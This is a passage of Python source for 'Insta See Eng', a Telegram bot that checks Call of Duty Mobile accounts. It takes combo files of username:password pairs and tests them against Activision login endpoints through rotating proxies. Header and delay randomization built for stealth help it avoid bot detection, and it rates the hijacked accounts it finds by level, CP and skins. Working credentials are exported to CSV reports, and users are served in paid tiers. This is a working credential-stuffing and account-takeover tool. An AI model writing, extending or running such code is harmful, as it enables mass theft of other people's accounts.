║    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝            ║
║                                                      ║
║    ███████╗███████╗███████╗                          ║
║    ██╔════╝██╔════╝██╔════╝                          ║
║    ███████╗█████╗  █████╗                            ║
║    ╚════██║██╔══╝  ██╔══╝                            ║
║    ███████║███████╗███████╗                          ║
║    ╚══════╝╚══════╝╚══════╝                          ║
║                                                      ║
║    ███████╗███╗   ██╗ ██████╗                        ║
║    ██╔════╝████╗  ██║██╔════╝                        ║
║    █████╗  ██╔██╗ ██║██║  ███╗                       ║
║    ██╔══╝  ██║╚██╗██║██║   ██║                       ║
║    ███████╗██║ ╚████║╚██████╔╝                       ║
║    ╚══════╝╚═╝  ╚═══╝ ╚═════╝                        ║
║                                                      ║
║    Bot Name : Insta See Eng          v{__version__}         ║
║    Owner    : @{__author__:<43}║
║    Python   : {platform.python_version():<43}║
║    Platform : {platform.system() + ' ' + platform.machine():<43}║
║                                                      ║
╚══════════════════════════════════════════════════════╝
{Style.RESET_ALL if HAS_COLORAMA else ''}
"""
    print(banner)
    print(f"  {'─' * 54}")
    print(f"  ✅ Storage directories created")
    print(f"  ✅ Logging initialized → {LOGS_DIR}/")
    print(f"  ⚙️  Workers: {MAX_WORKERS}")
    print(f"  🌐 Proxy file: {PROXIES_FILE}")
    print(f"  🔑 Token: {'SET ✅' if BOT_TOKEN and BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE' else 'NOT SET ❌'}")
    print(f"  {'─' * 54}")
    print()


def validate_config() -> List[str]:
    """Validate configuration before startup. Returns list of warnings."""
    warnings: List[str] = []

    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        warnings.append("BOT_TOKEN is not set — bot will NOT start")

    if not OWNER_ID:
        warnings.append(
            "OWNER_ID is not set — admin notifications and owner checks are disabled\n"
            "  Set OWNER_ID env var to your Telegram user ID"
        )

    if MAX_WORKERS > 50:
        warnings.append(f"MAX_WORKERS={MAX_WORKERS} is very high — may cause rate limiting")

    return warnings


def format_bytes(n: int) -> str:
    """Format bytes to human-readable string."""
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024.0:
            return f"{n:.1f}{unit}"
        n /= 1024.0
    return f"{n:.1f}PB"


def truncate_text(text: str, max_len: int = 50, suffix: str = "...") -> str:
    """Truncate text to max_len characters."""
    if len(text) <= max_len:
        return text
    return text[:max_len - len(suffix)] + suffix


def clean_username(username: str) -> str:
    """Clean up a username for display."""
    return username.replace("@", "").strip()


def is_email(s: str) -> bool:
    """Check if string looks like an email address."""
    return bool(re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", s))


def mask_password(pwd: str) -> str:
    """Partially mask a password for safe display."""
    if len(pwd) <= 2:
        return "*" * len(pwd)
    return pwd[0] + "*" * (len(pwd) - 2) + pwd[-1]


def chunk_list(lst: List[Any], size: int) -> Generator[List[Any], None, None]:
    """Split a list into chunks of given size."""
    for i in range(0, len(lst), size):
        yield lst[i:i + size]


def utcnow_str() -> str:
    """Return current UTC datetime as ISO string."""
    return datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")


async def download_file_content(url: str, timeout: int = 30) -> Optional[bytes]:
    """Download raw bytes from a URL."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                if resp.status == 200:
                    return await resp.read()
    except Exception as e:
        logger.error(f"Download error {url}: {e}")
    return None


def count_lines_in_file(path: str) -> int:
    """Count lines in a text file efficiently."""
    try:
        count = 0
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for _ in f:
                count += 1
        return count
    except Exception:
        return 0


def detect_combo_format(sample: str) -> str:
    """
    Auto-detect the format of a combo file from a sample.
    Returns description string.
    """
    lines = [l.strip() for l in sample.splitlines() if l.strip()][:20]
    if not lines:
        return "unknown"

    colon_count  = sum(1 for l in lines if ":" in l)
    pipe_count   = sum(1 for l in lines if "|" in l)
    email_count  = sum(1 for l in lines if "@" in l and ":" in l)

    if email_count > len(lines) * 0.5:
        return "email:password"
    if colon_count > len(lines) * 0.7:
        return "username:password (colon)"
    if pipe_count > len(lines) * 0.7:
        return "username|password (pipe)"
    return "mixed/unknown"


class RateLimiter:
    """
    Simple async token bucket rate limiter.
    Used to avoid hammering APIs.
    """

    def __init__(self, rate: float, burst: int = 1) -> None:
        self.rate    = rate         # tokens per second
        self.burst   = burst        # max burst
        self._tokens = float(burst)
        self._updated = time.monotonic()
        self._lock   = asyncio.Lock()

    async def acquire(self) -> None:
        async with self._lock:
            now = time.monotonic()
            elapsed = now - self._updated
            self._tokens = min(self.burst, self._tokens + elapsed * self.rate)
            self._updated = now

            if self._tokens >= 1.0:
                self._tokens -= 1.0
                return

            wait = (1.0 - self._tokens) / self.rate
        await asyncio.sleep(wait)

    async def __aenter__(self) -> "RateLimiter":
        await self.acquire()
        return self

    async def __aexit__(self, *args: Any) -> None:
        pass


class CircularBuffer(Generic[TypeVar("T")]):
    """A fixed-size circular buffer."""

    _T = TypeVar("_T")

    def __init__(self, max_size: int) -> None:
        self._buf:  deque = deque(maxlen=max_size)

    def push(self, item: Any) -> None:
        self._buf.append(item)

    def items(self) -> List[Any]:
        return list(self._buf)

    def __len__(self) -> int:
        return len(self._buf)

    def __iter__(self) -> Iterator[Any]:
        return iter(self._buf)


class StatsWindow:
    """
    Sliding window stats tracker for speed calculations.
    Tracks events over a time window (e.g., last 60 seconds).
    """

    def __init__(self, window_sec: float = 60.0) -> None:
        self._window   = window_sec
        self._events:  deque = deque()  # timestamps
        self._lock:    asyncio.Lock = asyncio.Lock()

    async def record(self) -> None:
        now = time.monotonic()
        async with self._lock:
            self._events.append(now)
            cutoff = now - self._window
            while self._events and self._events[0] < cutoff:
                self._events.popleft()

    async def rate(self) -> float:
        """Events per second over the window."""
        now = time.monotonic()
        async with self._lock:
            cutoff = now - self._window
            while self._events and self._events[0] < cutoff:
                self._events.popleft()
            count = len(self._events)
        if count == 0:
            return 0.0
        return count / self._window

    async def total(self) -> int:
        async with self._lock:
            return len(self._events)


class SimpleCache(Generic[TypeVar("K"), TypeVar("V")]):
    """
    Simple TTL cache.
    Evicts entries older than ttl_seconds on access.
    """

    _K = TypeVar("_K")
    _V = TypeVar("_V")

    def __init__(self, ttl_seconds: float = 300.0, max_size: int = 1000) -> None:
        self._ttl      = ttl_seconds
        self._max_size = max_size
        self._store:   OrderedDict = OrderedDict()
        self._times:   Dict[Any, float] = {}
        self._lock:    asyncio.Lock = asyncio.Lock()

    async def get(self, key: Any) -> Optional[Any]:
        async with self._lock:
            if key not in self._store:
                return None
            if time.monotonic() - self._times[key] > self._ttl:
                del self._store[key]
                del self._times[key]
                return None
            self._store.move_to_end(key)
            return self._store[key]

    async def set(self, key: Any, value: Any) -> None:
        async with self._lock:
            if key in self._store:
                self._store.move_to_end(key)
            self._store[key] = value
            self._times[key] = time.monotonic()
            if len(self._store) > self._max_size:
                oldest = next(iter(self._store))
                del self._store[oldest]
                del self._times[oldest]

    async def invalidate(self, key: Any) -> None:
        async with self._lock:
            self._store.pop(key, None)
            self._times.pop(key, None)

    async def clear(self) -> None:
        async with self._lock:
            self._store.clear()
            self._times.clear()

    @property
    def size(self) -> int:
        return len(self._store)


class EventEmitter:
    """
    Simple async event emitter for decoupled component communication.
    """

    def __init__(self) -> None:
        self._listeners: DefaultDict[str, List[Callable]] = defaultdict(list)

    def on(self, event: str, callback: Callable) -> None:
        self._listeners[event].append(callback)

    def off(self, event: str, callback: Callable) -> None:
        self._listeners[event] = [c for c in self._listeners[event] if c != callback]

    async def emit(self, event: str, *args: Any, **kwargs: Any) -> None:
        for cb in self._listeners.get(event, []):
            if asyncio.iscoroutinefunction(cb):
                await cb(*args, **kwargs)
            else:
                cb(*args, **kwargs)

    def emit_sync(self, event: str, *args: Any, **kwargs: Any) -> None:
        for cb in self._listeners.get(event, []):
            if not asyncio.iscoroutinefunction(cb):
                cb(*args, **kwargs)


# =============================================================================
#   ADDITIONAL CHECKER METHODS (Extended CODM Lookup)
# =============================================================================

class ExtendedCODMChecker(CODMChecker):
    """
    Extended checker with additional lookup methods.
    Falls back through multiple check strategies.
    """

    async def check_account(
        self, username: str, password: str, retries: int = MAX_RETRIES
    ) -> AccountResult:
        """
        Extended check: tries primary Activision method, then fallback methods.
        """
        raw = f"{username}:{password}"
        start = time.monotonic()

        # Method 1: Standard Activision login
        result = await super().check_account(username, password, retries)

        if result.status in (AccountStatus.ERROR, AccountStatus.TIMEOUT):
            # Method 2: Alternate endpoint
            alt = await self._try_alternate_check(username, password)
            if alt:
                alt.elapsed_ms = (time.monotonic() - start) * 1000
                alt.raw = raw
                return alt

        result.elapsed_ms = (time.monotonic() - start) * 1000
        return result

    async def _try_alternate_check(
        self, username: str, password: str
    ) -> Optional[AccountResult]:
        """
        Alternate check via CODM mobile API endpoint.
        """
        raw = f"{username}:{password}"
        proxy = await self.proxy_mgr.get_proxy()
        proxy_url = proxy.url if proxy else None

        try:
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
                headers=DEFAULT_HEADERS,
            ) as session:
                # Try a simplified form-based login check
                payload = {
                    "login": username,
                    "password": password,
                    "locale": "en",
                }
                async with session.post(
                    f"{ACTIVISION_BASE_URL}/en/login",
                    data=payload,
                    proxy=proxy_url,
                    ssl=False,
                    allow_redirects=True,
                ) as resp:
                    body = await resp.text()
                    status = resp.status

                    if status == 200 and any(k in body.lower() for k in [
                        "my.callofduty.com/en/profile",
                        "signedIn",
                        "logout",
                        "dashboard",
                    ]):
                        return AccountResult(
                            raw=raw, username=username, password=password,
                            status=AccountStatus.HIT,
                            detail="Valid login (alternate method)",
                        )
                    elif status == 401 or any(k in body.lower() for k in self.WRONG_PASS_KEYWORDS):
                        return AccountResult(
                            raw=raw, username=username, password=password,
                            status=AccountStatus.BAD,
                            detail="Invalid credentials (alternate check)",
                        )
        except Exception as e:
            logger.debug(f"Alternate check failed for {username}: {e}")
        return None

    async def bulk_verify_hits(self, hits: List[AccountResult]) -> List[AccountResult]:
        """
        Re-verify a list of hit accounts to reduce false positives.
        Returns only confirmed hits.
        """
        confirmed: List[AccountResult] = []
        for result in hits:
            re_check = await super().check_account(result.username, result.password, retries=1)
            if re_check.is_hit:
                confirmed.append(result)
            await asyncio.sleep(0.5)  # Small delay between re-checks
        return confirmed

    def analyze_results(self, results: List[AccountResult]) -> Dict[str, Any]:
        """Analyze results and return aggregated statistics."""
        hits   = [r for r in results if r.is_hit]
        bad    = [r for r in results if r.is_bad]
        errors = [r for r in results if r.is_error]

        levels = [r.level for r in hits if r.level > 0]
        cps    = [r.cp for r in hits if r.cp > 0]
        skins  = [r.skins for r in hits if r.skins > 0]

        return {
            "total":          len(results),
            "hits":           len(hits),
            "bad":            len(bad),
            "errors":         len(errors),
            "hit_rate":       len(hits) / len(results) * 100 if results else 0,
            "avg_level":      sum(levels) / len(levels) if levels else 0,
            "max_level":      max(levels, default=0),
            "avg_cp":         sum(cps) / len(cps) if cps else 0,
            "total_cp":       sum(cps),
            "avg_skins":      sum(skins) / len(skins) if skins else 0,
            "high_value":     sum(1 for r in hits if r.level >= 100 or r.cp >= 1000),
            "platforms":      Counter(r.platform for r in hits if r.platform),
            "ranks":          Counter(r.rank for r in hits if r.rank),
            "clans":          sum(1 for r in hits if r.clan),
        }


# =============================================================================
#   REPORT GENERATOR
# =============================================================================

class ReportGenerator:
    """
    Generates human-readable reports from job results.
    Can produce plain text, JSON, or CSV reports.
    """

    @staticmethod
    async def generate_txt_report(job: CheckJob, path: str) -> str:
        """Generate a detailed text report."""
        checker = ExtendedCODMChecker(ProxyManager())  # For analysis only
        analysis = checker.analyze_results(job.results)

        report_lines = [
            "=" * 60,
            f"  INSTA SEE ENG — CODM Account Checker Report",
            f"  Owner: @JAYYYTTTTTTTtt",
            "=" * 60,
            f"",
            f"  JOB INFORMATION",
            f"  {'─' * 40}",
            f"  Job ID       : {job.job_id}",
            f"  User ID      : {job.user_id}",
            f"  Created      : {datetime.datetime.fromtimestamp(job.created_at).isoformat()}",
            f"  Started      : {datetime.datetime.fromtimestamp(job.started_at).isoformat() if job.started_at else 'N/A'}",
            f"  Finished     : {datetime.datetime.fromtimestamp(job.finished_at).isoformat() if job.finished_at else 'N/A'}",
            f"  Duration     : {AnimationEngine.format_time(job.elapsed)}",
            f"  Status       : {job.status.value}",
            f"",
            f"  RESULTS SUMMARY",
            f"  {'─' * 40}",
            f"  Total Lines  : {job.total}",
            f"  Checked      : {job.checked}",
            f"  Hits         : {job.hits}",
            f"  Bad          : {job.bad}",
            f"  Errors       : {job.errors}",
            f"  Hit Rate     : {analysis['hit_rate']:.2f}%",
            f"  Avg Speed    : {AnimationEngine.format_speed(job.speed)}",
            f"",
            f"  ACCOUNT ANALYSIS (Hits Only)",
            f"  {'─' * 40}",
            f"  Avg Level    : {analysis['avg_level']:.1f}",
            f"  Max Level    : {analysis['max_level']}",
            f"  High Value   : {analysis['high_value']} accounts (Lv100+ or 1000+ CP)",
            f"  Total CP     : {analysis['total_cp']:,}",
            f"  Avg CP       : {analysis['avg_cp']:.1f}",
            f"  Avg Skins    : {analysis['avg_skins']:.1f}",
            f"  With Clan    : {analysis['clans']}",
        ]

        if analysis["platforms"]:
            report_lines += [f"", f"  Platform Distribution:"]
            for platform, count in analysis["platforms"].most_common():
                report_lines.append(f"    {platform:20s} : {count}")

        if analysis["ranks"]:
            report_lines += [f"", f"  Rank Distribution (top 10):"]
            for rank, count in analysis["ranks"].most_common(10):
                report_lines.append(f"    {rank:30s} : {count}")

        report_lines += [
            f"",
            "=" * 60,
            f"  Generated by Insta See Eng | @JAYYYTTTTTTTtt",
            f"  {utcnow_str()}",
            "=" * 60,
        ]

        content = "\n".join(report_lines)
        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            await f.write(content)
        return path

    @staticmethod
    async def generate_csv_report(job: CheckJob, path: str) -> str:
        """Generate a CSV report of all hits."""
        async with aiofiles.open(path, "w", encoding="utf-8", newline="") as f:
            header = "username,password,level,rank,cp,skins,clan,platform,region,last_seen,status,checked_at\n"
            await f.write(header)
            for r in job.hit_results:
                row = ",".join([
                    _csv_safe(r.username),
                    _csv_safe(r.password),
                    str(r.level),
                    _csv_safe(r.rank),
                    str(r.cp),
                    str(r.skins),
                    _csv_safe(r.clan),
                    _csv_safe(r.platform),
                    _csv_safe(r.region),
                    _csv_safe(r.last_seen),
                    r.status.value,
                    r.checked_at,
                ])
                await f.write(row + "\n")
        return path


def _csv_safe(val: str) -> str:
    """Escape a value for CSV."""
    if not val:
        return ""
    if "," in val or '"' in val or "\n" in val:
        return '"' + val.replace('"', '""') + '"'
    return val


# =============================================================================
#   PROXY TESTER
# =============================================================================

class ProxyTester:
    """
    Tests proxies for connectivity and speed.
    Removes dead proxies from the pool.
    """

    TEST_URL   = "https://httpbin.org/ip"
    TIMEOUT    = 10.0

    @classmethod
    async def test_proxy(cls, proxy: Proxy) -> Tuple[bool, float]:
        """
        Test a proxy. Returns (is_alive, latency_ms).
        """
        start = time.monotonic()
        try:
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=cls.TIMEOUT)
            ) as session:
                async with session.get(
                    cls.TEST_URL,
                    proxy=proxy.url,
                    ssl=False,
                ) as resp:
                    if resp.status == 200:
                        ms = (time.monotonic() - start) * 1000
                        return True, ms
        except Exception:
            pass
        return False, 0.0

    @classmethod
    async def test_all(cls, proxies: List[Proxy]) -> Dict[str, Any]:
        """Test all proxies concurrently."""
        results = {"alive": 0, "dead": 0, "avg_ms": 0.0}
        tasks = [cls.test_proxy(p) for p in proxies]
        outcomes = await asyncio.gather(*tasks, return_exceptions=True)

        latencies = []
        for proxy, outcome in zip(proxies, outcomes):
            if isinstance(outcome, Exception):
                proxy.record_failure()
                results["dead"] += 1
            else:
                alive, ms = outcome
                if alive:
                    proxy.record_success(ms)
                    latencies.append(ms)
                    results["alive"] += 1
                else:
                    proxy.record_failure()
                    results["dead"] += 1

        if latencies:
            results["avg_ms"] = sum(latencies) / len(latencies)

        return results

    @classmethod
    async def filter_alive(cls, proxies: List[Proxy]) -> List[Proxy]:
        """Return only alive proxies."""
        tasks = [cls.test_proxy(p) for p in proxies]
        outcomes = await asyncio.gather(*tasks, return_exceptions=True)
        alive = []
        for proxy, outcome in zip(proxies, outcomes):
            if not isinstance(outcome, Exception) and outcome[0]:
                alive.append(proxy)
        return alive


# =============================================================================
#   ACCOUNT VALIDATOR (pre-check)
# =============================================================================

class AccountValidator:
    """
    Pre-validates accounts before sending to the checker.
    Catches obvious invalid formats early.
    """

    # Common email domains for validation
    COMMON_DOMAINS = {
        "gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "live.com",
        "icloud.com", "protonmail.com", "aol.com", "mail.com", "msn.com",
        "me.com", "mac.com", "googlemail.com", "ymail.com", "inbox.com",
    }

    # Minimum password length
    MIN_PASSWORD_LEN = 1
    MAX_PASSWORD_LEN = 128

    @classmethod
    def validate(cls, username: str, password: str) -> Tuple[bool, str]:
        """
        Validate a username/password pair.
        Returns (is_valid, reason_if_invalid).
        """
        # Username checks
        if not username:
            return False, "Empty username"
        if len(username) < 3:
            return False, "Username too short"
        if len(username) > 200:
            return False, "Username too long"
        if not any(c.isalnum() for c in username):
            return False, "Username has no alphanumeric chars"

        # Password checks
        if not password:
            return False, "Empty password"
        if len(password) < cls.MIN_PASSWORD_LEN:
            return False, "Password too short"
        if len(password) > cls.MAX_PASSWORD_LEN:
            return False, "Password too long"

        # If username looks like email, validate email format
        if "@" in username:
            if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", username):
                return False, "Invalid email format"
            domain = username.split("@")[-1].lower()
            if len(domain) < 4:
                return False, "Invalid email domain"

        return True, ""

    @classmethod
    def filter_valid(
        cls, accounts: List[Tuple[str, str]]
    ) -> Tuple[List[Tuple[str, str]], List[str]]:
        """Filter accounts into valid and invalid lists."""
        valid:   List[Tuple[str, str]] = []
        invalid: List[str] = []
        for user, pwd in accounts:
            ok, reason = cls.validate(user, pwd)
            if ok:
                valid.append((user, pwd))
            else:
                invalid.append(f"{user}:{pwd} ({reason})")
        return valid, invalid

    @classmethod
    def deduplicate(cls, accounts: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
        """Remove duplicate username:password pairs."""
        seen: Set[str] = set()
        result: List[Tuple[str, str]] = []
        for user, pwd in accounts:
            key = f"{user.lower()}:{pwd}"
            if key not in seen:
                seen.add(key)
                result.append((user, pwd))
        return result

    @classmethod
    def sort_by_priority(cls, accounts: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
        """
        Sort accounts to check most likely valid ones first.
        Prioritizes email accounts from common providers.
        """
        def score(acc: Tuple[str, str]) -> int:
            user, pwd = acc
            s = 0
            if "@" in user:
                s += 5  # Email accounts are more likely real
                domain = user.split("@")[-1].lower()
                if domain in cls.COMMON_DOMAINS:
                    s += 3
            if len(pwd) >= 8:
                s += 2  # Longer passwords more likely real
            if any(c.isupper() for c in pwd):
                s += 1
            if any(c.isdigit() for c in pwd):
                s += 1
            if any(c in "!@#$%^&*" for c in pwd):
                s += 1
            return -s  # Negative for descending sort
        return sorted(accounts, key=score)


# =============================================================================
#   NOTIFICATION SYSTEM
# =============================================================================

class NotificationManager:
    """
    Manages notifications to users and admin.
    Handles rate limiting to avoid Telegram flood limits.
    """

    def __init__(self, bot: Any, owner_id: int) -> None:
        self._bot      = bot
        self._owner_id = owner_id
        self._rate_limiter = RateLimiter(rate=20.0, burst=30)  # 20 msgs/sec max

    async def notify_user(
        self, chat_id: int, text: str,
        parse_mode: str = ParseMode.MARKDOWN,
        reply_markup: Any = None,
    ) -> bool:
        """Send notification to a user with rate limiting."""
        async with self._rate_limiter:
            try:
                await self._bot.send_message(
                    chat_id=chat_id,
                    text=text[:MAX_MESSAGE_LENGTH],
                    parse_mode=parse_mode,
                    disable_web_page_preview=True,
                    reply_markup=reply_markup,
                )
                return True
            except RetryAfter as e:
                await asyncio.sleep(e.retry_after + 1)
                return await self.notify_user(chat_id, text, parse_mode, reply_markup)
            except Forbidden:
                return False  # User blocked bot
            except TelegramError as e:
                logger.debug(f"Notify error for {chat_id}: {e}")
                return False

    async def notify_owner(self, text: str) -> bool:
        """Send notification to the owner."""
        if not self._owner_id:
            return False
        return await self.notify_user(self._owner_id, text)

    async def send_file_to_user(
        self, chat_id: int, path: str, caption: str = ""
    ) -> bool:
        """Send a file to a user with rate limiting."""
        async with self._rate_limiter:
            try:
                async with aiofiles.open(path, "rb") as f:
                    data = await f.read()
                buf = BytesIO(data)
                buf.name = Path(path).name
                await self._bot.send_document(
                    chat_id=chat_id,
                    document=buf,
                    caption=caption[:1024] if caption else None,
                    parse_mode=ParseMode.MARKDOWN,
                )
                return True
            except Exception as e:
                logger.debug(f"Send file error to {chat_id}: {e}")
                return False

    async def broadcast(
        self, user_ids: List[int], text: str, delay: float = 0.05
    ) -> Tuple[int, int]:
        """
        Broadcast a message to multiple users.
        Returns (success_count, fail_count).
        """
        success = 0
        failed  = 0
        for uid in user_ids:
            ok = await self.notify_user(uid, text)
            if ok:
                success += 1
            else:
                failed += 1
            await asyncio.sleep(delay)
        return success, failed


# =============================================================================
#   ADVANCED QUEUE FEATURES
# =============================================================================

class PriorityJobQueue:
    """
    Priority-based job queue.
    Owner/Admin jobs jump to the front.
    """

    PRIORITY_MAP = {
        UserTier.OWNER:   0,
        UserTier.ADMIN:   1,
        UserTier.PREMIUM: 2,
        UserTier.FREE:    3,
    }

    def __init__(self) -> None:
        self._queues: Dict[int, asyncio.Queue] = {
            0: asyncio.Queue(),
            1: asyncio.Queue(),
            2: asyncio.Queue(),
            3: asyncio.Queue(),
        }
        self._lock = asyncio.Lock()

    async def put(self, job: CheckJob, tier: UserTier) -> None:
        priority = self.PRIORITY_MAP.get(tier, 3)
        await self._queues[priority].put(job)

    async def get(self) -> CheckJob:
        """Get next job — highest priority first."""
        while True:
            for priority in sorted(self._queues.keys()):
                q = self._queues[priority]
                if not q.empty():
                    return await q.get()
            await asyncio.sleep(0.1)

    def total_size(self) -> int:
        return sum(q.qsize() for q in self._queues.values())

    def size_by_priority(self) -> Dict[int, int]:
        return {p: q.qsize() for p, q in self._queues.items()}


class JobHistory:
    """
    Tracks completed job history per user.
    """

    def __init__(self, max_per_user: int = 20) -> None:
        self._history: DefaultDict[int, deque] = defaultdict(lambda: deque(maxlen=max_per_user))
        self._lock = asyncio.Lock()

    async def record(self, job: CheckJob) -> None:
        async with self._lock:
            entry = {
                "job_id":    job.job_id,
                "total":     job.total,
                "hits":      job.hits,
                "bad":       job.bad,
                "errors":    job.errors,
                "elapsed":   job.elapsed,
                "status":    job.status.value,
                "finished":  job.finished_at,
            }
            self._history[job.user_id].append(entry)

    async def get_user_history(self, user_id: int) -> List[Dict]:
        async with self._lock:
            return list(self._history[user_id])

    async def get_user_stats(self, user_id: int) -> Dict[str, Any]:
        history = await self.get_user_history(user_id)
        if not history:
            return {}
        total_checked = sum(h["total"] for h in history)
        total_hits    = sum(h["hits"] for h in history)
        return {
            "jobs":          len(history),
            "total_checked": total_checked,
            "total_hits":    total_hits,
            "hit_rate":      total_hits / total_checked * 100 if total_checked else 0,
            "avg_speed":     sum(h["total"] / max(h["elapsed"], 0.1) for h in history) / len(history),
        }


# =============================================================================
#   FILE UTILITIES
# =============================================================================

async def safe_delete(path: str, delay: float = 30.0) -> None:
    """Delete a file after a delay (for cleanup)."""
    await asyncio.sleep(delay)
    try:
        Path(path).unlink(missing_ok=True)
    except Exception:
        pass


async def merge_files(input_paths: List[str], output_path: str, dedup: bool = True) -> int:
    """
    Merge multiple text files into one.
    Optionally de-duplicate lines.
    Returns total line count written.
    """
    seen: Set[str] = set()
    total = 0

    async with aiofiles.open(output_path, "w", encoding="utf-8") as out:
        for path in input_paths:
            try:
                async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
                    async for line in f:
                        line = line.rstrip("\n\r")
                        if not line:
                            continue
                        if dedup:
                            if line in seen:
                                continue
                            seen.add(line)
                        await out.write(line + "\n")
                        total += 1
            except FileNotFoundError:
                pass

    return total


async def split_file(input_path: str, chunk_size: int, output_dir: str) -> List[str]:
    """
    Split a text file into chunks of chunk_size lines.
    Returns list of output file paths.
    """
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    output_paths: List[str] = []
    chunk_num = 0
    current_lines: List[str] = []

    async with aiofiles.open(input_path, "r", encoding="utf-8", errors="ignore") as f:
        async for line in f:
            current_lines.append(line)
            if len(current_lines) >= chunk_size:
                out_path = str(Path(output_dir) / f"chunk_{chunk_num:04d}.txt")
                async with aiofiles.open(out_path, "w", encoding="utf-8") as out:
                    await out.writelines(current_lines)
                output_paths.append(out_path)
                current_lines = []
                chunk_num += 1

    if current_lines:
        out_path = str(Path(output_dir) / f"chunk_{chunk_num:04d}.txt")
        async with aiofiles.open(out_path, "w", encoding="utf-8") as out:
            await out.writelines(current_lines)
        output_paths.append(out_path)

    return output_paths


async def zip_files(file_paths: List[str], zip_path: str) -> str:
    """Create a zip archive from a list of files."""
    def _zip() -> None:
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for fp in file_paths:
                if Path(fp).exists():
                    zf.write(fp, Path(fp).name)

    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, _zip)
    return zip_path


def human_file_size(path: str) -> str:
    """Return human-readable file size for a path."""
    try:
        size = Path(path).stat().st_size
        return format_bytes(size)
    except Exception:
        return "unknown"


# =============================================================================
#   ANTI-DETECTION / STEALTH UTILITIES
# =============================================================================

class StealthHeaders:
    """
    Generates realistic, varying browser headers to avoid bot detection.
    """

    USER_AGENTS = [
        # Chrome on Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        # Firefox on Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        # Chrome on Mac
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        # Safari on Mac
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        # Edge on Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    ]

    ACCEPT_LANGUAGES = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9",
        "en-US,en;q=0.8,fr;q=0.6",
        "en-US,en;q=0.9,de;q=0.7",
        "en;q=0.9,fr;q=0.8",
    ]

    @classmethod
    def generate(cls) -> Dict[str, str]:
        """Generate a random but realistic header set."""
        import random
        ua = random.choice(cls.USER_AGENTS)
        al = random.choice(cls.ACCEPT_LANGUAGES)

        headers = {
            "User-Agent":        ua,
            "Accept":            "application/json, text/plain, */*",
            "Accept-Language":   al,
            "Accept-Encoding":   "gzip, deflate, br",
            "Connection":        "keep-alive",
            "Origin":            "https://my.callofduty.com",
            "Referer":           "https://my.callofduty.com/",
        }

        # Add Chrome-specific headers if Chrome UA
        if "Chrome/" in ua and "Edg/" not in ua:
            ver = ua.split("Chrome/")[1].split(".")[0]
            headers["Sec-Ch-Ua"] = f'"Chromium";v="{ver}", "Google Chrome";v="{ver}", "Not-A.Brand";v="99"'
            headers["Sec-Ch-Ua-Mobile"] = "?0"
            headers["Sec-Ch-Ua-Platform"] = '"Windows"' if "Windows" in ua else '"macOS"'
            headers["Sec-Fetch-Dest"] = "empty"
            headers["Sec-Fetch-Mode"] = "cors"
            headers["Sec-Fetch-Site"] = "same-origin"

        return headers

    @classmethod
    def randomize_delays(cls, base_delay: float) -> float:
        """Add human-like jitter to request delays."""
        import random
        jitter = random.uniform(-base_delay * 0.3, base_delay * 0.5)
        return max(0.0, base_delay + jitter)


# =============================================================================
#   SESSION POOL
# =============================================================================

class SessionPool:
    """
    Pool of aiohttp.ClientSession objects for reuse.
    Sessions are rotated to distribute cookies and headers.
    """

    def __init__(self, size: int = 5) -> None:
        self._sessions: List[aiohttp.ClientSession] = []
        self._size     = size
        self._index    = 0
        self._lock     = asyncio.Lock()

    async def initialize(self) -> None:
        for _ in range(self._size):
            session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False, limit=20),
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
                headers=StealthHeaders.generate(),
            )
            self._sessions.append(session)

    async def get(self) -> aiohttp.ClientSession:
        async with self._lock:
            session = self._sessions[self._index % self._size]
            self._index += 1
            return session

    async def close_all(self) -> None:
        for session in self._sessions:
            await session.close()
        self._sessions.clear()


# =============================================================================
#   WATCHDOG (auto-restart on failure)
# =============================================================================

class Watchdog:
    """
    Monitors the bot and restarts it if it stops responding.
    Runs as a background task.
    """

    def __init__(self, check_interval: float = 30.0, max_failures: int = 3) -> None:
